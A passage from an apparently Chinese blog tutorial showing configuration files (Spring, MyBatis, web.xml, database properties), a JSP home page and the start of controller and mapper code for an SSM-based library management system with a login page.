class="hljs-name">mvc:annotation-driven</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--2.static resource filter--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--3.scan controller--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.hu.controller&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--view--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>spring-dao.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-tag"><span class="hljs-string">       http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--1.connect database file--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;classpath:database.properties&quot;</span>/&gt;</span><br><br><span class="hljs-comment">&lt;!--2.datasource--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jdbcUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- c3p0 private property --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;maxPoolSize&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;minPoolSize&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!-- close connection not auto commit --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autoCommitOnClose&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!-- get connection over time --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;checkoutTimeout&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10000&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!-- when connection failure restart counts --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;acquireRetryAttempts&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--3.sqlSessionFactory--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sqlSessionFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;dataSource&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--bind mybatis equipment file--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;configLocation&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;classpath:mybatis-config.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--equip dao interface scan--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--add sqlSessionFactory--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sqlSessionFactoryBeanName&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sqlSessionFactory&quot;</span>/&gt;</span><br>        <span class="hljs-comment">&lt;!--scan--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basePackage&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.hu.Mapper&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>mybatis-config.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.hu.pojo&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.hu.Mapper.bookMapper&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.hu.Mapper.adminMapper&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p>database.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">jdbc.driver</span>=<span class="hljs-string">com.mysql.jdbc.Driver</span><br><span class="hljs-meta">jdbc.url</span>=<span class="hljs-string">jdbc:mysql://localhost:3306/ssmbuild?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=Asia/Shanghai</span><br><span class="hljs-meta">jdbc.username</span>=<span class="hljs-string">root</span><br><span class="hljs-meta">jdbc.password</span>=<span class="hljs-string">100122200</span><br></code></pre></td></tr></table></figure><p>applicationContext.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-tag"><span class="hljs-string">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;spring-dao.xml&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;spring-service.xml&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;spring-mvc.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><br><span class="hljs-tag"><span class="hljs-string">          http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--DisapatchServlet--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>springmvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--complexcode filter--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>utf-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--Session--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">session-config</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">session-timeout</span>&gt;</span>15<span class="hljs-tag">&lt;/<span class="hljs-name">session-timeout</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">session-config</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>index.jsp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: <span class="hljs-number">10251</span><br>  <span class="hljs-built_in">Date</span>: <span class="hljs-number">2021</span>/<span class="hljs-number">6</span>/<span class="hljs-number">11</span><br>  Time: <span class="hljs-number">10</span>:<span class="hljs-number">30</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br><br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;邂逅海棠&lt;/title&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width,initial-scale=1&quot;</span>&gt;<br>    &lt;title&gt;自由而无用&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span>&gt;<br>    &lt;style&gt;<br>        body&#123;<br>            padding-top: 50px;<br>        &#125;<br>        .start&#123;<br>            padding:40px 15px;<br>            text-align: center;<br>        &#125;<br>        .xh&#123;<br>            padding-left: 415px;<br>            margin-top: 80px;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;navbar navbar-default navbar-fixed-top&quot;</span> role=<span class="hljs-string">&quot;navigation&quot;</span>&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;<br>            &lt;a href=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;navbar-brand&quot;</span>&gt;自由而无用&lt;/a&gt;<br>        &lt;/div&gt;<br>        &lt;div id=<span class="hljs-string">&quot;navbar&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span>&gt;<br>            &lt;ul <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;<br>                &lt;li <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;active&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>&lt;/li&gt;<br>                &lt;li&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/book/login&quot;</span>&gt;</span>图书管理系统<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>&lt;/li&gt;<br>                &lt;li&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/book/about&quot;</span>&gt;</span>关于我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>&lt;/li&gt;<br>            &lt;/ul&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/nav&gt;<br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot; container xh&quot;</span>&gt;<br>    &lt;img src=<span class="hljs-string">&quot;images/计算机学院院徽.png&quot;</span> alt=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;img-circle&quot;</span>&gt;<br>&lt;/div&gt;<br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;container &quot;</span>&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;start&quot;</span>&gt;<br>        &lt;h1 id=<span class="hljs-string">&quot;note1&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;text-primary&quot;</span>&gt;唯实惟新 至诚致志&lt;/h1&gt;<br>        &lt;p <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;lead&quot;</span>&gt;欢迎来到自由而无用&lt;/p&gt;<br>    &lt;/div&gt;<br>&lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="一套示例代码-实现用户登录功能"><a href="#一套示例代码-实现用户登录功能" class="headerlink" title="一套示例代码(实现用户登录功能)"></a>一套示例代码(实现用户登录功能)</h3><p>controller层：</p><ul><li>adminController.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hu.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/book&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book_manage</span> </span>&#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/book_manage&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">get_Book_manage</span><span class="hljs-params">()</span></span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;book_manage&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>loginController.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hu.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/book&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loginController</span> </span>&#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/login&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAbout</span><span class="hljs-params">()</span></span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Mapper层：</p><ul><li>adminMapper.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hu.Mapper;<br><br><span class="hljs-keyword">import</span> com.hu.pojo.admin;<br><span class="hljs-keyword">import</span> com.hu.pojo.books;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">adminMapper</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addadmin</span><span class="hljs-params">(admin admin)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deleteadminById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">updateadmin</span><span class="hljs-params">(admin admin)</span></span>;<br>    <span class="hljs-function">admin <span class="hljs-title">queryadminById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>;<br>    <span class="hljs-function">List&lt;admin&gt; <span class="hljs-title">queryAlladmin</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>adminMapper.xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 